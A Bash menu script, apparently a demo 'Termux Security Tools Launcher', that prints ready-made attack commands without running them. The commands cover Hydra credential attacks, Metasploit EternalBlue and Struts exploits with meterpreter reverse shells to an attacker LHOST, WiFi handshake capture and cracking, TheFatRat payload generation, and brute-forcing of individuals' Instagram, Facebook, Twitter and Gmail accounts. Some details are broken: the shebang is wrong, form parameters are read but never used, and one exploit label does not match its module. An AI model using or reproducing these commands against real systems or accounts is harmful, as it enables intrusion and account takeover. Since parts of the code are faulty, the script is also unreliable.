#!/bash

# ========================================================================
# Termux Security Tools Launcher
# A script providing easy access to security tools and exploits installed
# by the Termux Security Toolkit
# ========================================================================

# Color definitions for better UX
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
RESET="\033[0m"

# Display banner
display_banner() {
    clear
    echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${BLUE}║${RESET}${MAGENTA}             TERMUX SECURITY TOOLS LAUNCHER           ${RESET}${BLUE}║${RESET}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${RESET}"
    echo -e "${GREEN}[*] Easily launch security tools and exploits${RESET}\n"
}

# Function to check if a tool is installed (simulated in demo)
is_installed() {
    local tool=$1
    echo -e "${YELLOW}[*] Checking if $tool is installed...${RESET}"
    sleep 0.5
    return 0  # Always return success in demo mode
}

# Network Scanning Tools
run_nmap_scan() {
    local target=$1
    local scan_type=$2

    # Check if nmap is installed
    is_installed "nmap"

    echo -e "\n${CYAN}[*] Running Nmap scan on target: $target${RESET}"
    
    case $scan_type in
        "quick")
            echo -e "${GREEN}[+] Running quick scan (-T4 -F)${RESET}"
            echo -e "${YELLOW}    Command: nmap -T4 -F $target ${RESET}"
            ;;
        "detailed")
            echo -e "${GREEN}[+] Running detailed scan (-sV -sC -A -p-)${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -sC -A -p- $target ${RESET}"
            ;;
        "stealth")
            echo -e "${GREEN}[+] Running stealth scan (-sS -T2)${RESET}"
            echo -e "${YELLOW}    Command: nmap -sS -T2 $target ${RESET}"
            ;;
        "udp")
            echo -e "${GREEN}[+] Running UDP scan (-sU --top-ports 100)${RESET}"
            echo -e "${YELLOW}    Command: nmap -sU --top-ports 100 $target ${RESET}"
            ;;
        *)
            echo -e "${GREEN}[+] Running default scan${RESET}"
            echo -e "${YELLOW}    Command: nmap $target ${RESET}"
            ;;
    esac
    
    echo -e "${CYAN}[*] Scan completed!${RESET}"
}

# Password cracking tools
run_hydra_attack() {
    local target=$1
    local service=$2
    local username_file=$3
    local password_file=$4

    # Check if hydra is installed
    is_installed "hydra"

    echo -e "\n${CYAN}[*] Running Hydra password attack on target: $target${RESET}"
    echo -e "${GREEN}[+] Service: $service${RESET}"
    echo -e "${GREEN}[+] Username file: $username_file${RESET}"
    echo -e "${GREEN}[+] Password file: $password_file${RESET}"
    
    echo -e "${YELLOW}    Command: hydra -L $username_file -P $password_file $target $service${RESET}"
    
    echo -e "${CYAN}[*] Attack completed!${RESET}"
}

# Metasploit Framework automation
run_metasploit() {
    local exploit=$1
    local payload=$2
    local target=$3
    local lhost=$4
    local lport=${5:-4444}

    # Check if metasploit is installed
    is_installed "metasploit"

    echo -e "\n${CYAN}[*] Setting up Metasploit Framework${RESET}"
    echo -e "${GREEN}[+] Exploit: $exploit${RESET}"
    echo -e "${GREEN}[+] Payload: $payload${RESET}"
    echo -e "${GREEN}[+] Target: $target${RESET}"
    echo -e "${GREEN}[+] LHOST: $lhost${RESET}"
    echo -e "${GREEN}[+] LPORT: $lport${RESET}"
    
    echo -e "${YELLOW}[*] Command: msfconsole -q -x \"use $exploit; set PAYLOAD $payload; set RHOSTS $target; set LHOST $lhost; set LPORT $lport; exploit\"${RESET}"
    
    echo -e "${CYAN}[*] Metasploit completed!${RESET}"
}

# Wifi Analysis tools
run_aircrack() {
    local interface=$1
    local action=$2

    # Check if aircrack-ng is installed
    is_installed "aircrack-ng"

    echo -e "\n${CYAN}[*] Running Aircrack-ng on interface: $interface${RESET}"
    
    case $action in
        "scan")
            echo -e "${GREEN}[+] Starting wireless scanning${RESET}"
            echo -e "${YELLOW}    Command: airmon-ng start $interface && airodump-ng ${interface}mon${RESET}"
            ;;
        "capture")
            local bssid=$3
            local channel=$4
            echo -e "${GREEN}[+] Capturing handshakes (BSSID: $bssid, Channel: $channel)${RESET}"
            echo -e "${YELLOW}    Command: airmon-ng start $interface && airodump-ng -c $channel --bssid $bssid -w capture ${interface}mon${RESET}"
            ;;
        "crack")
            local capture_file=$3
            local wordlist=$4
            echo -e "${GREEN}[+] Cracking captured handshake (File: $capture_file, Wordlist: $wordlist)${RESET}"
            echo -e "${YELLOW}    Command: aircrack-ng $capture_file -w $wordlist${RESET}"
            ;;
        *)
            echo -e "${GREEN}[+] Starting wireless monitoring mode${RESET}"
            echo -e "${YELLOW}    Command: airmon-ng start $interface${RESET}"
            ;;
    esac
    
    echo -e "${CYAN}[*] Aircrack operation completed!${RESET}"
}

# Brute force tools
run_brute_force() {
    local target_type=$1
    local target=$2
    local username=$3
    local wordlist=$4

    # Check if brute force tools are installed
    is_installed "brut3k1t"

    echo -e "\n${CYAN}[*] Running brute force attack${RESET}"
    echo -e "${GREEN}[+] Target type: $target_type${RESET}"
    echo -e "${GREEN}[+] Target: $target${RESET}"
    echo -e "${GREEN}[+] Username: $username${RESET}"
    echo -e "${GREEN}[+] Wordlist: $wordlist${RESET}"
    
    echo -e "${YELLOW}    Command: python brut3k1t.py -s $target_type -a $target -u $username -w $wordlist${RESET}"
    
    echo -e "${CYAN}[*] Brute force attack completed!${RESET}"
}

# TheFatRat payload generator
run_fatrat() {
    local payload_type=$1
    local lhost=$2
    local lport=${3:-4444}

    # Check if TheFatRat is installed
    is_installed "TheFatRat"

    echo -e "\n${CYAN}[*] Running TheFatRat payload generator${RESET}"
    echo -e "${GREEN}[+] Payload type: $payload_type${RESET}"
    echo -e "${GREEN}[+] LHOST: $lhost${RESET}"
    echo -e "${GREEN}[+] LPORT: $lport${RESET}"
    
    echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat.sh ${RESET}"
    echo -e "${YELLOW}    (Then select the corresponding options in the interactive menu)${RESET}"
    
    echo -e "${CYAN}[*] TheFatRat execution completed!${RESET}"
}

# Main menu
main_menu() {
    display_banner
    
    echo -e "${BLUE}[1]${RESET} Network Scanning Tools (Nmap)"
    echo -e "${BLUE}[2]${RESET} Password Cracking Tools (Hydra)"
    echo -e "${BLUE}[3]${RESET} Metasploit Framework"
    echo -e "${BLUE}[4]${RESET} WiFi Analysis Tools (Aircrack-ng)"
    echo -e "${BLUE}[5]${RESET} Brute Force Tools"
    echo -e "${BLUE}[6]${RESET} TheFatRat Payload Generator"
    echo -e "${BLUE}[7]${RESET} Exit\n"
    
    read -p "$(echo -e $YELLOW"[?] Select an option: "$RESET)" main_choice
    
    case $main_choice in
        1)
            network_scanning_menu
            ;;
        2)
            password_cracking_menu
            ;;
        3)
            metasploit_menu
            ;;
        4)
            wifi_analysis_menu
            ;;
        5)
            brute_force_menu
            ;;
        6)
            fatrat_menu
            ;;
        7)
            echo -e "\n${GREEN}[✓] Thank you for using the Termux Security Tools Launcher!${RESET}"
            exit 0
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            main_menu
            ;;
    esac
}

# Network scanning menu
network_scanning_menu() {
    display_banner
    echo -e "${MAGENTA}=== NETWORK SCANNING TOOLS ===${RESET}\n"
    
    echo -e "${BLUE}[1]${RESET} Quick Scan (Fast, Common Ports)"
    echo -e "${BLUE}[2]${RESET} Detailed Scan (All Ports, Services, OS Detection)"
    echo -e "${BLUE}[3]${RESET} Stealth Scan (SYN Scan)"
    echo -e "${BLUE}[4]${RESET} UDP Scan"
    echo -e "${BLUE}[5]${RESET} Back to Main Menu\n"
    
    read -p "$(echo -e $YELLOW"[?] Select a scan type: "$RESET)" scan_choice
    
    if [[ $scan_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
    
    case $scan_choice in
        1)
            run_nmap_scan "$target" "quick"
            ;;
        2)
            run_nmap_scan "$target" "detailed"
            ;;
        3)
            run_nmap_scan "$target" "stealth"
            ;;
        4)
            run_nmap_scan "$target" "udp"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            network_scanning_menu
            return
            ;;
    esac
    
    echo -e "\n${YELLOW}[?] Press Enter to continue...${RESET}"
    read
    network_scanning_menu
}

# Password cracking menu
password_cracking_menu() {
    display_banner
    echo -e "${MAGENTA}=== PASSWORD CRACKING TOOLS ===${RESET}\n"
    
    echo -e "${BLUE}[1]${RESET} SSH Attack"
    echo -e "${BLUE}[2]${RESET} FTP Attack"
    echo -e "${BLUE}[3]${RESET} HTTP-POST Form Attack"
    echo -e "${BLUE}[4]${RESET} SMB Attack"
    echo -e "${BLUE}[5]${RESET} Back to Main Menu\n"
    
    read -p "$(echo -e $YELLOW"[?] Select an attack type: "$RESET)" attack_choice
    
    if [[ $attack_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
    read -p "$(echo -e $YELLOW"[?] Enter username file path: "$RESET)" username_file
    read -p "$(echo -e $YELLOW"[?] Enter password file path: "$RESET)" password_file
    
    case $attack_choice in
        1)
            run_hydra_attack "$target" "ssh" "$username_file" "$password_file"
            ;;
        2)
            run_hydra_attack "$target" "ftp" "$username_file" "$password_file"
            ;;
        3)
            read -p "$(echo -e $YELLOW"[?] Enter form URL (e.g., /login.php): "$RESET)" form_url
            read -p "$(echo -e $YELLOW"[?] Enter form parameters (e.g., username=^USER^&password=^PASS^): "$RESET)" form_params
            read -p "$(echo -e $YELLOW"[?] Enter failed login message: "$RESET)" fail_msg
            run_hydra_attack "$target" "http-post-form" "$username_file" "$password_file"
            ;;
        4)
            run_hydra_attack "$target" "smb" "$username_file" "$password_file"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            password_cracking_menu
            return
            ;;
    esac
    
    echo -e "\n${YELLOW}[?] Press Enter to continue...${RESET}"
    read
    password_cracking_menu
}

# Metasploit menu
metasploit_menu() {
    display_banner
    echo -e "${MAGENTA}=== METASPLOIT FRAMEWORK ===${RESET}\n"
    
    echo -e "${BLUE}[1]${RESET} Eternal Blue (Windows SMB)"
    echo -e "${BLUE}[2]${RESET} MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption"
    echo -e "${BLUE}[3]${RESET} Apache Struts REST Plugin Command Injection"
    echo -e "${BLUE}[4]${RESET} WordPress Plugin Insert PHP"
    echo -e "${BLUE}[5]${RESET} Back to Main Menu\n"
    
    read -p "$(echo -e $YELLOW"[?] Select an exploit: "$RESET)" exploit_choice
    
    if [[ $exploit_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter target IP: "$RESET)" target
    read -p "$(echo -e $YELLOW"[?] Enter your IP (LHOST): "$RESET)" lhost
    read -p "$(echo -e $YELLOW"[?] Enter listening port (default: 4444): "$RESET)" lport
    lport=${lport:-4444}
    
    case $exploit_choice in
        1)
            run_metasploit "exploit/windows/smb/ms17_010_eternalblue" "windows/x64/meterpreter/reverse_tcp" "$target" "$lhost" "$lport"
            ;;
        2)
            run_metasploit "exploit/windows/smb/ms17_010_psexec" "windows/x64/meterpreter/reverse_tcp" "$target" "$lhost" "$lport"
            ;;
        3)
            read -p "$(echo -e $YELLOW"[?] Enter target URL (e.g., http://example.com:8080/struts2-rest-showcase/): "$RESET)" target_url
            run_metasploit "exploit/multi/http/struts2_rest_xstream" "java/meterpreter/reverse_tcp" "$target_url" "$lhost" "$lport"
            ;;
        4)
            read -p "$(echo -e $YELLOW"[?] Enter target WordPress URL: "$RESET)" target_url
            run_metasploit "exploit/unix/webapp/wp_phpmailer_host_header" "php/meterpreter/reverse_tcp" "$target_url" "$lhost" "$lport"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            metasploit_menu
            return
            ;;
    esac
    
    echo -e "\n${YELLOW}[?] Press Enter to continue...${RESET}"
    read
    metasploit_menu
}

# WiFi analysis menu
wifi_analysis_menu() {
    display_banner
    echo -e "${MAGENTA}=== WIFI ANALYSIS TOOLS ===${RESET}\n"
    
    echo -e "${BLUE}[1]${RESET} Start Scanning for Networks"
    echo -e "${BLUE}[2]${RESET} Capture Handshake"
    echo -e "${BLUE}[3]${RESET} Crack Handshake"
    echo -e "${BLUE}[4]${RESET} Back to Main Menu\n"
    
    read -p "$(echo -e $YELLOW"[?] Select an option: "$RESET)" wifi_choice
    
    if [[ $wifi_choice -eq 4 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter wireless interface (e.g., wlan0): "$RESET)" interface
    
    case $wifi_choice in
        1)
            run_aircrack "$interface" "scan"
            ;;
        2)
            read -p "$(echo -e $YELLOW"[?] Enter BSSID of target AP: "$RESET)" bssid
            read -p "$(echo -e $YELLOW"[?] Enter channel of target AP: "$RESET)" channel
            run_aircrack "$interface" "capture" "$bssid" "$channel"
            ;;
        3)
            read -p "$(echo -e $YELLOW"[?] Enter path to capture file (.cap): "$RESET)" capture_file
            read -p "$(echo -e $YELLOW"[?] Enter path to wordlist: "$RESET)" wordlist
            run_aircrack "$interface" "crack" "$capture_file" "$wordlist"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            wifi_analysis_menu
            return
            ;;
    esac
    
    echo -e "\n${YELLOW}[?] Press Enter to continue...${RESET}"
    read
    wifi_analysis_menu
}

# Brute force menu
brute_force_menu() {
    display_banner
    echo -e "${MAGENTA}=== BRUTE FORCE TOOLS ===${RESET}\n"
    
    echo -e "${BLUE}[1]${RESET} Social Media (Instagram)"
    echo -e "${BLUE}[2]${RESET} Social Media (Facebook)"
    echo -e "${BLUE}[3]${RESET} Social Media (Twitter)"
    echo -e "${BLUE}[4]${RESET} Email (Gmail)"
    echo -e "${BLUE}[5]${RESET} Back to Main Menu\n"
    
    read -p "$(echo -e $YELLOW"[?] Select a target type: "$RESET)" bf_choice
    
    if [[ $bf_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter username or email: "$RESET)" username
    read -p "$(echo -e $YELLOW"[?] Enter path to wordlist: "$RESET)" wordlist
    
    case $bf_choice in
        1)
            run_brute_force "instagram" "instagram.com" "$username" "$wordlist"
            ;;
        2)
            run_brute_force "facebook" "facebook.com" "$username" "$wordlist"
            ;;
        3)
            run_brute_force "twitter" "twitter.com" "$username" "$wordlist"
            ;;
        4)
            run_brute_force "gmail" "smtp.gmail.com" "$username" "$wordlist"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            brute_force_menu
            return
            ;;
    esac
    
    echo -e "\n${YELLOW}[?] Press Enter to continue...${RESET}"
    read
    brute_force_menu
}

# TheFatRat menu
fatrat_menu() {
    display_banner
    echo -e "${MAGENTA}=== THEFATRAT PAYLOAD GENERATOR ===${RESET}\n"
    
    echo -e "${BLUE}[1]${RESET} Android Payload"
    echo -e "${BLUE}[2]${RESET} Windows Payload"
    echo -e "${BLUE}[3]${RESET} Linux Payload"
    echo -e "${BLUE}[4]${RESET} MacOS Payload"
    echo -e "${BLUE}[5]${RESET} Back to Main Menu\n"
    
    read -p "$(echo -e $YELLOW"[?] Select a payload type: "$RESET)" payload_choice
    
    if [[ $payload_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter your IP (LHOST): "$RESET)" lhost
    read -p "$(echo -e $YELLOW"[?] Enter listening port (default: 4444): "$RESET)" lport
    lport=${lport:-4444}
    
    case $payload_choice in
        1)
            run_fatrat "android" "$lhost" "$lport"
            ;;
        2)
            run_fatrat "windows" "$lhost" "$lport"
            ;;
        3)
            run_fatrat "linux" "$lhost" "$lport"
            ;;
        4)
            run_fatrat "macos" "$lhost" "$lport"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            fatrat_menu
            return
            ;;
    esac
    
    echo -e "\n${YELLOW}[?] Press Enter to continue...${RESET}"
    read
    fatrat_menu
}

# Start the main menu
main_menu
